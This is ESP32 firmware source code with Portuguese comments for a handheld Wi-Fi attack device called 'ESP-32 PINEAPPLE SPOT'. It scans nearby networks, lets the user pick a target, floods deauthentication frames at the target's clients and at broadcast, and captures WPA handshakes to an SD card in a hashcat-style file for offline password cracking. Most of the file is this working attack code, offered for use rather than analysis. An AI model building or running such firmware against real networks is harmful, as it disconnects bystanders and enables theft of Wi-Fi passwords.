#include <WiFi.h>
#include <esp_wifi.h> 
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <vector> 
#include <algorithm> 
#include <string.h> 
#include <stdio.h> 
#include <SPI.h>    
#include <SD.h>     

// ------------------------------------------------------------------
// --- 1. DEFINIÇÕES DE HARDWARE (PINAGEM - AJUSTE AQUI) ---
// ------------------------------------------------------------------
#define OLED_RESET -1
Adafruit_SSD1306 display(128, 64, &Wire, OLED_RESET); 

// Pinos dos botões 
#define BT_MODE_SWITCH 13 
#define BT_ACTION 14      
 
// PINO CHIP SELECT DO SD CARD - AJUSTE ESTE PINO SE NECESSÁRIO!
#define SD_CS_PIN 5 

// ------------------------------------------------------------------
// --- 2. ESTRUTURAS 802.11 & HCAP ---
// ------------------------------------------------------------------
// Estruturas 802.11 para Promiscuous Mode
typedef struct {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint8_t seq_ctrl[2];
    uint8_t addr4[6];
} wifi_ieee80211_mac_hdr_t;

typedef struct {
    wifi_ieee80211_mac_hdr_t hdr;
    uint8_t payload[0]; 
} wifi_ieee8011_packet_t;

// Estrutura HCAP (Hashcat Capture Format - Simplificada)
#define EAPOL_SIZE 256 // Tamanho máximo do buffer EAPOL
typedef struct {
    uint8_t signature[4] = {'H', 'C', 'A', 'P'};
    uint32_t version = 1;
    uint8_t essid[36];
    uint8_t bssid[6];
    uint8_t client_mac[6];
    uint32_t eapol_size; 
    uint8_t eapol_frame[EAPOL_SIZE]; 
    uint32_t message_pair; 
    uint8_t keyver;        
    uint8_t padding[16];   
} hcap_t;

// ------------------------------------------------------------------
// --- 3. ESTRUTURAS DE ESTADO E AUDITORIA ---
// ------------------------------------------------------------------

#define EAPOL_MSG1 0b0001
#define EAPOL_MSG2 0b0010
#define EAPOL_MSG3 0b0100
#define EAPOL_MSG4 0b1000
#define HANDSHAKE_COMPLETE 0b1111

const int HANDSHAKE_TIMEOUT_MS = 5000; 

// Estrutura de Rastreamento
struct HandshakeTracking {
    uint8_t bssid[6];      
    uint8_t client_mac[6]; 
    uint8_t stage_mask = 0; 
    uint32_t last_activity = 0; 
    uint8_t raw_eapol[EAPOL_SIZE]; 
    uint32_t eapol_len = 0;
};

// Estrutura para um Handshake Capturado
struct CapturedHandshake {
    uint8_t bssid[6];
    uint8_t client_mac[6];
    uint8_t raw_eapol[EAPOL_SIZE]; 
    uint32_t eapol_len;
    String ssid;
    uint8_t channel;
};

// Estrutura de Ponto de Acesso (AP Scanner)
struct AccessPointInfo {
    String ssid;
    uint8_t bssid[6];
    int8_t rssi;
    uint8_t channel;
};

// Estrutura de Estatísticas
struct WifiPacketStats {
    uint32_t probe_count = 0;
    uint32_t beacon_count = 0;
    uint32_t deauth_count = 0;
    uint32_t data_packet_count = 0; 
    uint32_t eapol_count = 0;       
    uint32_t pmeid_count = 0;       
    char raw_data_buffer[64];       
    int current_channel = 1;        
};

// Enumeração de Modos
enum SystemMode : uint8_t {
    PROBE_SNIFF = 0, BEACON_SNIFF, DEAUTH_SNIFF, PACKET_MONITOR,       
    EAPOL_PMEID_SCAN, DEAUTH_ATTACK, AP_SCANNER_MENU, RAW_CAPTURE, SCAN_ALL,             
    NUM_MODES
};


// ------------------------------------------------------------------
// --- 4. VARIÁVEIS GLOBAIS ---
// ------------------------------------------------------------------
// Nome e Versão Oficial (V15.2) - Unificados conforme a última solicitação
const char* TOOL_NAME_SPLASH = "ESP-32 PINEAPPLE SPOT V15.2";
const char* TOOL_VERSION = "V15.2";
const char* TOOL_HARDWARE = "Hardware: ESP32"; 

volatile SystemMode system_mode = PROBE_SNIFF;
WifiPacketStats stats; 
volatile unsigned long last_mode_switch = 0; 
volatile int selected_ap_index = 0; 
volatile SystemMode selection_mode_return = EAPOL_PMEID_SCAN; 
uint8_t target_bssid[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; 
uint8_t target_client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; 
uint8_t attack_channel = 6; 
String target_ssid = "NONE"; 
unsigned long last_deauth_send = 0; 
uint8_t deauth_frame_buffer[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00};

// Vetores de Dados
std::vector<HandshakeTracking> pending_handshakes;
std::vector<CapturedHandshake> captured_handshakes;
std::vector<AccessPointInfo> scanned_aps; 

// Nome dos Modos
const char* MODE_NAMES[] = {
    "PROBE REQUEST SNIFF", "BEACON SNIFF", "DEAUTH SNIFF", "PACKET MONITOR",       
    "EAPOL/PMEID SCAN", "DEAUTH ATTACK", "AP SCANNER MENU", "RAW CAPTURE", "SCAN ALL"
};


// ------------------------------------------------------------------
// --- 5. PROTÓTIPOS DE FUNÇÕES ---
// ------------------------------------------------------------------
void IRAM_ATTR isr_toggle_mode();
void IRAM_ATTR isr_action_button();
void wifi_sniffer_init();
void IRAM_ATTR wifi_packet_handler(void* buff, wifi_promiscuous_pkt_type_t type);
void process_eapol_handshakes();
void run_mode_logic(SystemMode mode);
void loop_sniffer_logic(SystemMode mode);
void displayModeInfo(SystemMode mode);
bool compare_macs(const uint8_t *a, const uint8_t *b);
String mac_to_string(const uint8_t *mac);
HandshakeTracking* find_or_create_handshake(const uint8_t *bssid, const uint8_t *client_mac);
void perform_ap_scan();
void save_hcap_to_sd(const CapturedHandshake& hs); 
uint8_t get_eapol_message_type(const uint8_t *eapol_frame, uint32_t len); 
void send_deauth_packet(const uint8_t *ap_mac, const uint8_t *client_mac);


// ------------------------------------------------------------------
// --- 6. SETUP (INICIALIZAÇÃO COM TELA DE SPLASH MINIMALISTA) ---
// ------------------------------------------------------------------
void setup() {
    Serial.begin(115200);
    Wire.begin();
    
    if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
        Serial.println(F("OLED falhou."));
        for (;;);
    }
    
    // --- TELA DE INICIALIZAÇÃO OFICIAL (SPLASH SCREEN - 13 SEGUNDOS) ---
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE); 
    
    // Nome da Ferramenta completo (Tamanho 1 - Padrão/Médio)
    display.setTextSize(1); 
    display.setCursor(0, 28); // Centralizado verticalmente
    display.println(TOOL_NAME_SPLASH);
    
    display.display();
    delay(13000); // Mostra a tela por 13 segundos
    // ------------------------------------------------------------------
    
    // Inicialização do SD Card
    if (!SD.begin(SD_CS_PIN)) {
        Serial.println("SD Card: Falha ao iniciar ou não encontrado. Verifique GPIO 5.");
    } else {
        Serial.println("SD Card Inicializado com sucesso.");
    }
    
    // Configuração dos Botões e ISRs
    pinMode(BT_MODE_SWITCH, INPUT_PULLUP);
    pinMode(BT_ACTION, INPUT_PULLUP); 
    attachInterrupt(digitalPinToInterrupt(BT_MODE_SWITCH), isr_toggle_mode, FALLING);
    attachInterrupt(digitalPinToInterrupt(BT_ACTION), isr_action_button, FALLING); 
    
    wifi_sniffer_init();
}

// ------------------------------------------------------------------
// --- 7. LOOP PRINCIPAL ---
// ------------------------------------------------------------------
void loop() {
    static SystemMode last_system_mode = (SystemMode)0xFF; 
    
    if (system_mode != last_system_mode) {
        Serial.printf("Modo alterado para: %s\n", MODE_NAMES[system_mode]);
        
        if (system_mode != AP_SCANNER_MENU) {
            memset(&stats, 0, sizeof(stats)); 
            stats.current_channel = 1; 
            esp_wifi_set_channel(stats.current_channel, WIFI_SECOND_CHAN_NONE);
        }
        
        if (system_mode == EAPOL_PMEID_SCAN) {
             pending_handshakes.clear();
             captured_handshakes.clear();
        }
        last_system_mode = system_mode;
    }
    
    process_eapol_handshakes();
    
    display.clearDisplay();
    displayModeInfo(system_mode);
    run_mode_logic(system_mode);
    display.display();

    delay(50);
}


// ------------------------------------------------------------------
// --- 8. FUNÇÕES DE WI-FI (INIT, HANDLER, ATTACK) ---
// ------------------------------------------------------------------

void wifi_sniffer_init() {
    WiFi.mode(WIFI_MODE_NULL); 
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(wifi_packet_handler);
    esp_wifi_set_channel(stats.current_channel, WIFI_SECOND_CHAN_NONE); 
}

void IRAM_ATTR wifi_packet_handler(void* buff, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buff;
    const wifi_ieee8011_packet_t *ipkt = (wifi_ieee8011_packet_t *)ppkt->payload;
    const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;

    uint8_t frame_control = hdr->frame_ctrl[0];
    uint8_t type_field = (frame_control & 0b00001100) >> 2;
    
    // Sniffing EAPOL
    if (type_field == 2 && system_mode == EAPOL_PMEID_SCAN) { 
        int payload_offset = 24; 
        if (ppkt->rx_ctrl.sig_len > payload_offset + 8) {
            uint8_t *payload = (uint8_t *)ipkt->payload;
            
            if (payload[payload_offset + 6] == 0x88 && payload[payload_offset + 7] == 0x8E) {
                 stats.eapol_count++; 
                 
                 HandshakeTracking* hs = find_or_create_handshake(hdr->addr3, hdr->addr1);
                 
                 if (hs) {
                     int eapol_start = 34; 
                     if (ppkt->rx_ctrl.sig_len > eapol_start) {
                        uint32_t len = ppkt->rx_ctrl.sig_len - eapol_start;
                        len = min((uint32_t)len, (uint32_t)EAPOL_SIZE);
                        
                        memcpy(hs->raw_eapol, (payload + eapol_start), len);
                        hs->eapol_len = len;
                     }
                 }
            }
        }
    }
    // Lógica básica de contagem para o display
    else if (type_field == 0) { // Management Frames
        uint8_t subtype = (frame_control & 0b11110000) >> 4;
        if (subtype == 4) stats.probe_count++;
        else if (subtype == 8) stats.beacon_count++;
        else if (subtype == 12) stats.deauth_count++;
    }
}

void send_deauth_packet(const uint8_t *ap_mac, const uint8_t *client_mac) {
    uint8_t client_broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    // 1. Envia Deauth para o cliente específico
    memcpy(&deauth_frame_buffer[4], client_mac, 6); 
    memcpy(&deauth_frame_buffer[10], ap_mac, 6);    
    memcpy(&deauth_frame_buffer[16], ap_mac, 6);    
    esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_buffer, sizeof(deauth_frame_buffer), false);
    
    // 2. Envia Deauth para o Broadcast (para todos os clientes)
    memcpy(&deauth_frame_buffer[4], client_broadcast, 6); 
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_buffer, sizeof(deauth_frame_buffer), false);
}


// ------------------------------------------------------------------
// --- 9. PARSING E HCAP ---
// ------------------------------------------------------------------

uint8_t get_eapol_message_type(const uint8_t *eapol_frame, uint32_t len) {
    if (len < 95 || eapol_frame[1] != 0x03) return 0; 

    uint16_t key_info = (eapol_frame[5] << 8) | eapol_frame[6]; 

    bool key_mic = (key_info & 0x0400); 
    bool secure = (key_info & 0x0800);  
    bool key_ack = (key_info & 0x4000); 
    bool install = (key_info & 0x8000); 

    if (key_ack && !key_mic) return EAPOL_MSG1;
    if (key_ack && key_mic && secure && install) return EAPOL_MSG2; 
    if (!key_ack && key_mic && secure && install) return EAPOL_MSG3; 
    if (key_mic && !key_ack && !secure && !install) return EAPOL_MSG4; 

    return 0; 
}


void process_eapol_handshakes() {
    if (system_mode != EAPOL_PMEID_SCAN) return;

    // 1. Limpeza de Handshakes Expirados
    unsigned long current_time = millis();
    pending_handshakes.erase(
        std::remove_if(pending_handshakes.begin(), pending_handshakes.end(), 
            [&](const HandshakeTracking& hs) {
                return (current_time - hs.last_activity > HANDSHAKE_TIMEOUT_MS && hs.stage_mask != HANDSHAKE_COMPLETE);
            }), 
        pending_handshakes.end());

    // 2. Processamento dos Pacotes EAPOL Capturados
    for (size_t i = 0; i < pending_handshakes.size(); ++i) {
        HandshakeTracking* hs = &pending_handshakes[i];

        if (hs->eapol_len > 0 && hs->stage_mask != HANDSHAKE_COMPLETE) {
            
            uint8_t msg_type = get_eapol_message_type(hs->raw_eapol, hs->eapol_len);
            
            if (msg_type > 0) {
                hs->stage_mask |= msg_type;
                hs->last_activity = current_time; 
                
                if (hs->stage_mask == HANDSHAKE_COMPLETE) { 
                    CapturedHandshake new_hs;
                    memcpy(new_hs.bssid, hs->bssid, 6);
                    memcpy(new_hs.client_mac, hs->client_mac, 6);
                    memcpy(new_hs.raw_eapol, hs->raw_eapol, hs->eapol_len);
                    new_hs.eapol_len = hs->eapol_len;
                    
                    new_hs.channel = attack_channel; 
                    new_hs.ssid = target_ssid; 

                    captured_handshakes.push_back(new_hs);
                    save_hcap_to_sd(new_hs);
                    
                    hs->stage_mask = HANDSHAKE_COMPLETE; 
                }
            }
            
            hs->eapol_len = 0; 
        }
    }
}


void save_hcap_to_sd(const CapturedHandshake& hs) {
    if (!SD.begin(SD_CS_PIN)) return; 

    hcap_t hcap_data;
    
    memset(hcap_data.essid, 0, 36);
    memcpy(hcap_data.essid, hs.ssid.c_str(), min(hs.ssid.length(), (size_t)32));
    
    memcpy(hcap_data.bssid, hs.bssid, 6);
    memcpy(hcap_data.client_mac, hs.client_mac, 6);
    hcap_data.eapol_size = hs.eapol_len;
    
    memcpy(hcap_data.eapol_frame, hs.raw_eapol, min(hs.eapol_len, (uint32_t)EAPOL_SIZE));

    hcap_data.message_pair = 0x02; 
    hcap_data.keyver = 0x02;      

    String filename = "/HCAP_" + mac_to_string(hs.bssid) + ".hcap";
    filename.replace(':', '_');
    
    File hcapFile = SD.open(filename.c_str(), FILE_WRITE); 

    if (hcapFile) {
        size_t written = hcapFile.write((uint8_t*)&hcap_data, sizeof(hcap_t));
        hcapFile.close();
        if (written == sizeof(hcap_t)) Serial.printf("HCAP Salvo: %s\n", filename.c_str());
    }
}

// ------------------------------------------------------------------
// --- 10. FUNÇÕES AUXILIARES DE RASTREAMENTO E MAC ---
// ------------------------------------------------------------------

String mac_to_string(const uint8_t *mac) {
    char macStr[18];
    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(macStr);
}

bool compare_macs(const uint8_t *a, const uint8_t *b) {
    return memcmp(a, b, 6) == 0;
}

HandshakeTracking* find_or_create_handshake(const uint8_t *bssid, const uint8_t *client_mac) {
    for (size_t i = 0; i < pending_handshakes.size(); ++i) {
        if (compare_macs(pending_handshakes[i].bssid, bssid) && 
            compare_macs(pending_handshakes[i].client_mac, client_mac)) {
            return &pending_handshakes[i];
        }
    }
    
    if (pending_handshakes.size() < 50) { 
        HandshakeTracking new_hs;
        memcpy(new_hs.bssid, bssid, 6);
        memcpy(new_hs.client_mac, client_mac, 6);
        new_hs.last_activity = millis();
        pending_handshakes.push_back(new_hs);
        return &pending_handshakes.back();
    }
    return nullptr;
}


// ------------------------------------------------------------------
// --- 11. FUNÇÕES DE DISPLAY E LÓGICA DE MODO ---
// ------------------------------------------------------------------

void loop_sniffer_logic(SystemMode mode) {
    if (mode == EAPOL_PMEID_SCAN || mode == DEAUTH_ATTACK) {
        if (!compare_macs(target_bssid, (uint8_t[]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})) {
             esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);
             stats.current_channel = attack_channel;
        } 
    }
}

void displayModeInfo(SystemMode mode) {
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);

    display.printf("MODE: %s\n", MODE_NAMES[mode]);
    display.printf("CH: %d | APs: %d\n", stats.current_channel, scanned_aps.size());

    if (mode == AP_SCANNER_MENU) {
        if (scanned_aps.size() > 0) {
            AccessPointInfo current_ap = scanned_aps[selected_ap_index];
            display.printf("-> %s\n", current_ap.ssid.c_str());
            display.printf("   RSSI: %d | CH: %d\n", current_ap.rssi, current_ap.channel);
            display.printf("   BSSID: %s\n", mac_to_string(current_ap.bssid).c_str());
        } else {
             display.println("-> SCANNING... (Pressione ACAO para Selecionar)");
        }
    }
    else {
        if (!compare_macs(target_bssid, (uint8_t[]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})) {
            display.printf("TARGET: %s\n", target_ssid.c_str());
            display.printf("BSSID: %s\n", mac_to_string(target_bssid).c_str());
        } else {
            display.println("TARGET: NONE (Pressione ACAO)");
        }

        if (mode == EAPOL_PMEID_SCAN) {
            display.printf("EAPOL: %lu | PEND: %lu\n", stats.eapol_count, pending_handshakes.size());
            display.printf("HCAPS: %lu\n", captured_handshakes.size());
        } else {
             display.printf("PROBES: %lu | BEACONS: %lu\n", stats.probe_count, stats.beacon_count);
             display.printf("DEAUTH: %lu | DATA: %lu\n", stats.deauth_count, stats.data_packet_count);
        }
    }
}

void run_mode_logic(SystemMode mode) {
    unsigned long current_time = millis();
    
    if (mode == AP_SCANNER_MENU) {
        static unsigned long last_scan = 0;
        if (current_time - last_scan > 5000) { 
            perform_ap_scan();
            last_scan = current_time;
        }
    }
    // Lógica para Salto de Canal (Channel Hopping)
    else if (mode != PROBE_SNIFF && mode != BEACON_SNIFF && mode != DEAUTH_SNIFF) {
        static unsigned long last_channel_hop = 0;
        if (current_time - last_channel_hop > 1000) { 
            stats.current_channel++;
            if (stats.current_channel > 13) { 
                stats.current_channel = 1;
            }
            if (mode != DEAUTH_ATTACK) {
                esp_wifi_set_channel(stats.current_channel, WIFI_SECOND_CHAN_NONE);
            }
            last_channel_hop = current_time;
        }
    }
    
    // Lógica de Ataque Deauth
    if (mode == DEAUTH_ATTACK) {
        if (!compare_macs(target_bssid, (uint8_t[]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})) {
            if (current_time - last_deauth_send > 100) {
                send_deauth_packet(target_bssid, target_client); 
                last_deauth_send = current_time;
            }
        }
    }
    
    loop_sniffer_logic(mode); 
}


// ------------------------------------------------------------------
// --- 12. FUNÇÕES DE SCANNER E INTERRUPÇÕES (ISRs) ---
// ------------------------------------------------------------------

void perform_ap_scan() {
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_MODE_STA); 
    
    int n = WiFi.scanNetworks();
    scanned_aps.clear();
    
    if (n > 0) {
        for (int i = 0; i < n; ++i) {
            AccessPointInfo ap;
            ap.ssid = WiFi.SSID(i);
            WiFi.BSSID(i, ap.bssid);
            ap.rssi = WiFi.RSSI(i);
            ap.channel = WiFi.channel(i);
            scanned_aps.push_back(ap);
        }
        if (selected_ap_index >= scanned_aps.size()) {
            selected_ap_index = 0;
        }
    }
    
    WiFi.mode(WIFI_MODE_NULL);
    esp_wifi_set_promiscuous(true); 
    esp_wifi_set_channel(stats.current_channel, WIFI_SECOND_CHAN_NONE);
}


void IRAM_ATTR isr_toggle_mode() {
    unsigned long current_time = millis();
    if (current_time - last_mode_switch > 200) { 
        
        if (system_mode == AP_SCANNER_MENU) {
            if (scanned_aps.size() > 0) {
                selected_ap_index = (selected_ap_index + 1) % scanned_aps.size();
            }
        } else {
            system_mode = (SystemMode)((system_mode + 1) % NUM_MODES);
        }
        last_mode_switch = current_time;
    }
}

void IRAM_ATTR isr_action_button() {
    unsigned long current_time = millis();
    if (current_time - last_mode_switch > 200) { 
        
        if (system_mode == AP_SCANNER_MENU) {
            if (scanned_aps.size() > 0 && selected_ap_index < scanned_aps.size()) {
                memcpy(target_bssid, scanned_aps[selected_ap_index].bssid, 6);
                attack_channel = scanned_aps[selected_ap_index].channel;
                target_ssid = scanned_aps[selected_ap_index].ssid;

                system_mode = selection_mode_return; 
            }
        } else {
            selection_mode_return = system_mode;
            system_mode = AP_SCANNER_MENU;
        }
        last_mode_switch = current_time;
    }
}
